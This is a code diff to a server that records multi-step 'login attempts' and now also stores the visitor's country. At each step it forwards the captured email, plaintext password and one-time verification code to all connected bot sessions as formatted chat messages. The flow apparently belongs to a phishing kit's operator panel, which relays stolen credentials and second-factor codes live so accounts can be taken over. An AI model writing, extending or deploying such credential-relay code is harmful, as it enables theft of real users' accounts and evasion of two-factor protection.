@@ -14,6 +14,7 @@ import { cors, json } from "./lib/cors";
 import { db } from "./lib/db/db";
 import { tables } from "./lib/db/schemas";
 import { saveAllMessages } from "./lib/db/utils";
+import { formatCountry } from "./lib/utils";
 import type { VerifyAttemptStatus } from "./types";
 
 require("@/lib/bot/bot");
@@ -73,7 +74,9 @@ const server = serve({
             .where(eq(tables.loginAttempt.id, loginAttempt.id));
 
           const messages = await sendMessageToAllSessions(
-            `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
+            `<b>⚠️ VERIFICATION ATTEMPT ⚠️</b>\n\n` +
+              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
+              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}\n` +
               `<b>🔒 EMAIL:</b> <code>${step3Payload.data.email}</code>\n` +
               `<b>🔑 PASSWORD:</b> <code>${step3Payload.data.password}</code>\n` +
               `<b>🔐 CODE:</b> <code>${basePayload.data.code}</code>`,
@@ -150,8 +153,10 @@ const server = serve({
             .where(eq(tables.loginAttempt.id, loginAttempt.id));
 
           const messages = await sendMessageToAllSessions(
-            `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-              `<b>🔒 EMAIL:</b> <code>${step2Payload.data.email}</code>\n` +
+            `<b>⚠️ LOGIN ATTEMPT ⚠️</b>\n\n` +
+              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
+              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}\n` +
+              `<b>✉️ EMAIL:</b> <code>${step2Payload.data.email}</code>\n` +
               `<b>🔑 PASSWORD:</b> <code>${step2Payload.data.password}</code>`,
             {
               parse_mode: "HTML",
@@ -197,7 +202,18 @@ const server = serve({
 
         //#region STEP 1: CREATE LOGIN ATTEMPT
         {
-          const userId = basePayload.data.userId.trim();
+          const step1Schema = baseSchema.extend({
+            country: z.string(),
+          });
+
+          const step1Payload = step1Schema.safeParse(body);
+
+          if (!step1Payload.success) {
+            return json({ error: z.treeifyError(step1Payload.error) }, 400);
+          }
+
+          const userId = step1Payload.data.userId.trim();
+          const country = step1Payload.data.country.trim();
 
           const [inserted] = await db
             .insert(tables.user)
@@ -221,6 +237,7 @@ const server = serve({
             .values({
               id: Bun.randomUUIDv7(),
               userId: user.id,
+              country: country,
             })
             .returning();
 
@@ -229,7 +246,9 @@ const server = serve({
           }
 
           const messages = await sendMessageToAllSessions(
-            `🔑 Login attempt from user <code>${loginAttempt.userId}</code>`,
+            `<b>🔑 LOGIN ATTEMPT</b>\n\n` +
+              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
+              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}`,
             {
               parse_mode: "HTML",
               reply_markup: {
